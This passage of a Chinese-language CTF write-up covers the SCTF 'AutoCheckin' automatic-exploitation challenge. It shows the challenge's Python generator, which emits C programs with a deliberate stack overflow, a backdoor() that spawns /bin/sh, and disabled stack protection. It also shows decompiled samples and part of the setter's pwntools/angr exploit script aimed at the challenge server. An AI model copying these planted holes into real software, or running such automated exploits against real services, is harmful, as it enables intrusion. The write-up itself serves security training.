class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">L = string.ascii_letters</span><br><span class="line">R = random.randint</span><br><span class="line">C = random.choice</span><br><span class="line">exploit_size = R(<span class="number">10</span>, <span class="number">20</span>)</span><br><span class="line">gifted = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rnd_str</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([L[R(<span class="number">0</span>, <span class="built_in">len</span>(L) - <span class="number">1</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_chall_enc</span>(<span class="params">v, n, l = <span class="number">0</span></span>):</span><br><span class="line">    op_list = [<span class="string">&quot;^&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;^&quot;</span>]</span><br><span class="line">    encs = [<span class="string">&quot;%s[%d] %s= 0x%x;&quot;</span> % (v, i, op_list[R(<span class="number">0</span>, <span class="built_in">len</span>(op_list) - <span class="number">1</span>)], R(<span class="number">0</span>, <span class="number">255</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    random.shuffle(encs)</span><br><span class="line">    <span class="keyword">if</span> l != <span class="number">0</span>:  encs = random.sample(encs, l)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\n&quot;</span>.join(encs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_exploit</span>():</span><br><span class="line">    code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    printf(&quot;<span class="subst">&#123;rnd_str(<span class="number">10</span>) + <span class="string">&quot;:&quot;</span>&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">    input_line(exp_buffer, <span class="subst">&#123;exploit_size + <span class="number">40</span>&#125;</span>);</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;gen_chall_enc(<span class="string">&quot;exp_buffer&quot;</span>, exploit_size, <span class="number">5</span>)&#125;</span></span></span><br><span class="line"><span class="string">    if (fksth(exp_buffer, &quot;<span class="subst">&#123;rnd_str(exploit_size - <span class="number">1</span>)&#125;</span>&quot;) == 0) return 0;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_chall_1</span>(<span class="params">l, r</span>):</span><br><span class="line">    challenge_name = rnd_str(R(<span class="number">10</span>, <span class="number">20</span>))</span><br><span class="line">    challenge_code = rnd_str(R(<span class="number">30</span>, <span class="number">60</span>))</span><br><span class="line">    challenge_len = <span class="built_in">len</span>(challenge_code)</span><br><span class="line">    code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    char chall[<span class="subst">&#123;challenge_len&#125;</span>];</span></span><br><span class="line"><span class="string">    printf(&quot;<span class="subst">&#123;challenge_name + <span class="string">&quot;:&quot;</span>&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">    input_line(chall, <span class="subst">&#123;challenge_len&#125;</span>);</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;gen_chall_enc(<span class="string">&quot;chall&quot;</span>, challenge_len)&#125;</span></span></span><br><span class="line"><span class="string">    if(fksth(chall, &quot;<span class="subst">&#123;challenge_code&#125;</span>&quot;) == 0) &#123;&#123;</span></span><br><span class="line"><span class="string">        <span class="subst">&#123;l&#125;</span></span></span><br><span class="line"><span class="string">    &#125;&#125; else &#123;&#123;</span></span><br><span class="line"><span class="string">        <span class="subst">&#123;r&#125;</span></span></span><br><span class="line"><span class="string">    &#125;&#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_chall_2</span>(<span class="params">l, r</span>):</span><br><span class="line">    op_list = [<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;^&quot;</span>]</span><br><span class="line">    num_num = R(<span class="number">4</span>, <span class="number">8</span>)</span><br><span class="line">    challs = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(challs) &lt; <span class="number">3</span>:</span><br><span class="line">        challs = []</span><br><span class="line">        <span class="keyword">for</span> pair <span class="keyword">in</span> itertools.combinations(<span class="built_in">range</span>(num_num), <span class="number">2</span>):</span><br><span class="line">            challs.append(<span class="string">f&quot;(d[<span class="subst">&#123;pair[<span class="number">0</span>]&#125;</span>] <span class="subst">&#123;C(op_list)&#125;</span> d[<span class="subst">&#123;pair[<span class="number">1</span>]&#125;</span>]) == <span class="subst">&#123;<span class="built_in">hex</span>(R(<span class="number">0</span>, <span class="number">0xFFFF</span>))&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> pair <span class="keyword">in</span> itertools.combinations(<span class="built_in">range</span>(num_num), <span class="number">3</span>):</span><br><span class="line">            challs.append(<span class="string">f&quot;(d[<span class="subst">&#123;pair[<span class="number">0</span>]&#125;</span>] <span class="subst">&#123;C(op_list)&#125;</span> d[<span class="subst">&#123;pair[<span class="number">1</span>]&#125;</span>] <span class="subst">&#123;C(op_list)&#125;</span> d[<span class="subst">&#123;pair[<span class="number">2</span>]&#125;</span>]) == <span class="subst">&#123;<span class="built_in">hex</span>(R(<span class="number">0</span>, <span class="number">0xFFFF</span>))&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    challs = random.sample(challs, <span class="number">1</span>)</span><br><span class="line">    lll = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> challs: lll.append(<span class="string">f&quot;&quot;&quot;if(<span class="subst">&#123;i&#125;</span>) &#123;&#123; <span class="subst">&#123;l&#125;</span> &#125;&#125; else &#123;&#123; <span class="subst">&#123;r&#125;</span> &#125;&#125; ;&quot;&quot;&quot;</span> )</span><br><span class="line">    code_1 = <span class="string">&quot;\n&quot;</span>.join(lll)</span><br><span class="line">    sss = <span class="string">&quot;\n&quot;</span>.join([<span class="string">&quot;d[%d] = input_val();&quot;</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num_num)])</span><br><span class="line">    code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    int d[<span class="subst">&#123;num_num&#125;</span>];</span></span><br><span class="line"><span class="string">    printf(&quot;<span class="subst">&#123;rnd_str(<span class="number">10</span>) + <span class="string">&quot;:&quot;</span>&#125;</span>&quot;);</span></span><br><span class="line"><span class="string">    <span class="subst">&#123;sss&#125;</span></span></span><br><span class="line"><span class="string">    <span class="subst">&#123;code_1&#125;</span></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_pwn</span>(<span class="params">deep</span>):</span><br><span class="line">    <span class="keyword">global</span> gifted</span><br><span class="line">    chall_func = random.choice([gen_chall_1, gen_chall_2])</span><br><span class="line">    <span class="keyword">if</span> deep == <span class="number">0</span>:</span><br><span class="line">        r = <span class="string">&quot;return 0;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> gifted <span class="keyword">and</span> random.randint(<span class="number">1</span>, <span class="number">5</span>) == <span class="number">4</span>:</span><br><span class="line">            gifted = <span class="literal">True</span></span><br><span class="line">            l = gen_exploit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = <span class="string">&quot;return 0;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = gen_pwn(deep - <span class="number">1</span>)</span><br><span class="line">        l = gen_pwn(deep - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> chall_func(l, r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_challenge</span>():</span><br><span class="line">    <span class="keyword">global</span> gifted, exploit_size</span><br><span class="line">    gifted = <span class="literal">False</span></span><br><span class="line">    template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    #include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">    #include &lt;string.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    #define EXPLOIT_SIZE 100</span></span><br><span class="line"><span class="string">    int input_val() &#123;</span></span><br><span class="line"><span class="string">        char buffer[20];</span></span><br><span class="line"><span class="string">        int i = 0;</span></span><br><span class="line"><span class="string">        char ch = getchar();</span></span><br><span class="line"><span class="string">        while(ch != &#x27; &#x27; &amp;&amp; i &lt; 19) &#123;</span></span><br><span class="line"><span class="string">            buffer[i++] = ch;</span></span><br><span class="line"><span class="string">            ch = getchar();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        buffer[i] = 0;</span></span><br><span class="line"><span class="string">        return atoi(buffer);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int input_line(char * buffer, size_t max_size) &#123;</span></span><br><span class="line"><span class="string">        int i;</span></span><br><span class="line"><span class="string">        for(i = 0; i &lt; max_size; i++) &#123;</span></span><br><span class="line"><span class="string">            char ch = getchar();</span></span><br><span class="line"><span class="string">            buffer[i] = ch;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        buffer[i] = 0;</span></span><br><span class="line"><span class="string">        return i;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int fksth(const char * s1, const char * s2) &#123;</span></span><br><span class="line"><span class="string">        int sum = 0;</span></span><br><span class="line"><span class="string">        for(int i = 0; s1[i] != 0 &amp;&amp; s2[i] != 0 ; i++) &#123;</span></span><br><span class="line"><span class="string">            sum += (s1[i] - s2[i]);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return sum;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    char data[4096] = &#123;0&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    void backdoor() &#123;</span></span><br><span class="line"><span class="string">        system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    void nothing() &#123;</span></span><br><span class="line"><span class="string">        printf(&quot;nothing\\n&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    void init() &#123;</span></span><br><span class="line"><span class="string">        setvbuf(stdin,  0LL, 2, 0LL);</span></span><br><span class="line"><span class="string">        setvbuf(stdout, 0LL, 2, 0LL);</span></span><br><span class="line"><span class="string">        setvbuf(stderr, 0LL, 2, 0LL);</span></span><br><span class="line"><span class="string">        alarm(120);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    int main() &#123;</span></span><br><span class="line"><span class="string">        char exp_buffer[%d];</span></span><br><span class="line"><span class="string">        init();</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> % (exploit_size, gen_pwn(<span class="number">6</span>)) <span class="comment"># 6</span></span><br><span class="line">    filename = rnd_str(<span class="number">6</span>)</span><br><span class="line">    source_file = os.path.join(tempfile.gettempdir(), filename + <span class="string">&quot;.cpp&quot;</span>)</span><br><span class="line">    out_file =<span class="string">&quot;/home/ctf/chall_&quot;</span> + filename</span><br><span class="line">    <span class="built_in">open</span>(source_file, <span class="string">&quot;w&quot;</span>).write(template)</span><br><span class="line">    os.system(<span class="string">&quot;g++ %s -O0 -no-pie -fno-stack-protector -o %s &quot;</span> % (source_file, out_file))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(out_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Compile Failed!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(out_file, <span class="string">&quot;rb&quot;</span>).read(), out_file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    s = <span class="string">&quot;&quot;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">20</span>))</span><br><span class="line">    prefix = s[:<span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(xxxx + %s) == %s &quot;</span> % (s[<span class="number">4</span>:],hashlib.sha256(s.encode()).hexdigest()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;give me xxxx:&quot;</span>)</span><br><span class="line">    ans = <span class="built_in">input</span>().strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(ans) == <span class="number">4</span> <span class="keyword">and</span> ans == prefix</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to SCTF, gl!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;AutoCheckin Challenge!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Easy StackOverFlow!!!!!!!&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">data, file = gen_challenge()</span><br><span class="line"><span class="keyword">if</span> data != <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(data).decode(<span class="string">&quot;ASCII&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==end==&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    os.system(<span class="string">&quot;/usr/sbin/chroot --userspec=1000:1000 /home/ctf ./&quot;</span> + os.path.basename(file))</span><br><span class="line">    os.unlink(file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Bye bye!&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>网上并没有找到比较详细的wp,这么一大坨python代码看着其实还是有点头大的,但还是能看出来这是在生成一个<u>会受随机因素影响</u>的c文件,然后编译</p>
<p>正常运行的话,最终也是会给出二进制可执行文件的base64数据,本地可以接收到,也就是本地能得到二进制文件,也就是autopwn这类题的常规套路了</p>
<p>实际上做题的时候是无法得到这个py文件的</p>
<p>不过复现嘛,本地我们可以选择稍微修改以下脚本,然后让其将源文件输出出来,于是得到了一个有四千多行的源码(直接看反编译也差不多)</p>
<p>生成的一大坨类似这样的代码,稍微理解一下最终的题目</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">chall[<span class="number">33</span>] ^= <span class="number">0x7d</span>;</span><br><span class="line">chall[<span class="number">4</span>] ^= <span class="number">0xca</span>;</span><br><span class="line">chall[<span class="number">38</span>] ^= <span class="number">0xa8</span>;</span><br><span class="line">chall[<span class="number">44</span>] ^= <span class="number">0x84</span>;</span><br><span class="line">chall[<span class="number">15</span>] ^= <span class="number">0xcf</span>;</span><br><span class="line">chall[<span class="number">1</span>] ^= <span class="number">0xac</span>;</span><br><span class="line">chall[<span class="number">16</span>] ^= <span class="number">0x58</span>;</span><br><span class="line">chall[<span class="number">20</span>] ^= <span class="number">0xfd</span>;</span><br><span class="line">chall[<span class="number">12</span>] ^= <span class="number">0x2</span>;</span><br><span class="line">chall[<span class="number">47</span>] ^= <span class="number">0x3d</span>;</span><br><span class="line">chall[<span class="number">13</span>] ^= <span class="number">0xa8</span>;</span><br><span class="line">chall[<span class="number">50</span>] ^= <span class="number">0x88</span>;</span><br><span class="line">chall[<span class="number">39</span>] ^= <span class="number">0x99</span>;</span><br><span class="line">chall[<span class="number">23</span>] ^= <span class="number">0xd6</span>;</span><br><span class="line">chall[<span class="number">34</span>] ^= <span class="number">0x4e</span>;</span><br><span class="line">chall[<span class="number">54</span>] ^= <span class="number">0x82</span>;</span><br><span class="line">chall[<span class="number">48</span>] ^= <span class="number">0x17</span>;</span><br><span class="line">    <span class="keyword">if</span>(fksth(chall, <span class="string">&quot;UtqILiNEQkZPtTJqzysqGduSIKNTXDJRYHWEVqvioXtGdTMdSHxYMOA&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="type">int</span> d[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pZicbrnwUg:&quot;</span>);</span><br><span class="line">    d[<span class="number">0</span>] = input_val();</span><br><span class="line">d[<span class="number">1</span>] = input_val();</span><br><span class="line">d[<span class="number">2</span>] = input_val();</span><br><span class="line">d[<span class="number">3</span>] = input_val();</span><br><span class="line">d[<span class="number">4</span>] = input_val();</span><br><span class="line">d[<span class="number">5</span>] = input_val();</span><br><span class="line">    <span class="keyword">if</span>((d[<span class="number">2</span>] + d[<span class="number">3</span>]) == <span class="number">0xda0c</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125; <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125; ;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="type">char</span> chall[<span class="number">37</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;EGNAdszGujynjUVS:&quot;</span>);</span><br><span class="line">    input_line(chall, <span class="number">37</span>);</span><br><span class="line">    chall[<span class="number">13</span>] ^= <span class="number">0x63</span>;</span><br><span class="line">chall[<span class="number">33</span>] ^= <span class="number">0xea</span>;</span><br><span class="line">chall[<span class="number">10</span>] ^= <span class="number">0x52</span>;</span><br><span class="line">chall[<span class="number">29</span>] ^= <span class="number">0x22</span>;</span><br><span class="line">chall[<span class="number">22</span>] ^= <span class="number">0x6d</span>;</span><br><span class="line">chall[<span class="number">17</span>] ^= <span class="number">0xb2</span>;</span><br><span class="line">chall[<span class="number">4</span>] ^= <span class="number">0x54</span>;</span><br><span class="line">chall[<span class="number">14</span>] ^= <span class="number">0x6</span>;</span><br><span class="line">chall[<span class="number">21</span>] ^= <span class="number">0xdd</span>;</span><br><span class="line">chall[<span class="number">31</span>] ^= <span class="number">0x8f</span>;</span><br><span class="line">chall[<span class="number">28</span>] ^= <span class="number">0xc8</span>;</span><br><span class="line">chall[<span class="number">25</span>] ^= <span class="number">0x5e</span>;</span><br></pre></td></tr></table></figure>
<p>最后能够找到有一个溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)fksth(&amp;v2394, <span class="string">&quot;ckNoMypfzSlqmjBYgPMLwKMbRBCiHuQyVacpXXAWKMZnKtJodDviIbMG&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;jTQSsBTwBM:&quot;</span>);</span><br><span class="line">  input_line(v3072, <span class="number">0x3A</span>uLL);</span><br><span class="line">  v3073 ^= <span class="number">0xAF</span>u;</span><br><span class="line">  v3075 ^= <span class="number">0x99</span>u;</span><br><span class="line">  v3076 ^= <span class="number">0xF5</span>u;</span><br><span class="line">  v3077 ^= <span class="number">0xD</span>u;</span><br><span class="line">  v3074 ^= <span class="number">0xE6</span>u;</span><br><span class="line">  fksth(v3072, <span class="string">&quot;MqEJKIdJeQbMxeUNT&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>char v3072[3]; // [rsp+1420h] [rbp-20h] BYREF</code></p>
<p>程序有设置alarm,那么关键就是如何短时间完成挑战了,也就是自动化pwn的套路,根据前面做的那些题的总结,自己有一个思路是按照纵横杯那题一样,通过检测最后是否会调用input时参数第一个参数为<code>rbp-20h</code>,但不大确定这个变量是不是固定在这个位置,应当是不固定的</p>
<p>看一下出题人给出的wp</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pass_proof</span>(<span class="params">target, part</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;123.60.82.85&quot;</span>, <span class="number">1447</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">proof = r.recvline().decode(<span class="string">&quot;ASCII&quot;</span>)</span><br><span class="line">ppp = pass_proof(proof[proof.find(<span class="string">&quot;== &quot;</span>) + <span class="number">3</span>: -<span class="number">2</span>], proof[<span class="built_in">len</span>(<span class="string">&quot;sha256(xxxx + &quot;</span>): proof.find(<span class="string">&quot;) == &quot;</span>)])</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;give me xxxx:&quot;</span>, ppp.encode(<span class="string">&quot;ASCII&quot;</span>))</span><br><span class="line">r.recvline()</span><br><span class="line">bin_data = base64.b64decode(r.recvline().decode(<span class="string">&quot;ASCII&quot;</span>))</span><br><span class="line"><span class="comment">###########################################################################################################</span></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;a.out&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(bin_data)</span><br><span class="line">ret_rop = bin_data.find(<span class="string">b&#x27;\xc3&#x27;</span>, <span class="number">0x1000</span>) + <span class="number">0x400000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret_rop:&quot;</span>, <span class="built_in">hex</span>(ret_rop))</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getBVV</span>(<span class="params">state, sizeInBytes, <span class="built_in">type</span> = <span class="string">&#x27;str&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">global</span> pathConditions</span><br><span class="line">    name = <span class="string">&#x27;s_&#x27;</span> + <span class="built_in">str</span>(state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>])</span><br><span class="line">    bvs = claripy.BVS(name, sizeInBytes * <span class="number">8</span>)</span><br><span class="line">    state.<span class="built_in">globals</span>[<span class="string">&#x27;symbols_count&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    state.<span class="built_in">globals</span>[name] = (bvs, <span class="built_in">type</span>)</span><br><span class="line">    <span class="keyword">return</span> bvs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">angr_load_str</span>(<span class="params">state, addr</span>):</span><br><span class="line">    s, i = <span class="string">&#x27;&#x27;</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ch = state.solver.<span class="built_in">eval</span>(state.memory.load(addr + i, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">        s += <span class="built_in">chr</span>(ch)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementCheckEquals</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, str1, str2</span>):</span><br><span class="line">        cmp1 = angr_load_str(self.state, str2).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        cmp0 = self.state.memory.load(str1, <span class="built_in">len</span>(cmp1))</span><br><span class="line">        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(<span class="number">0</span>, <span class="number">32</span>), claripy.BVV(<span class="number">1</span>, <span class="number">32</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplacementCheckInput</span>(angr.SimProcedure):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, 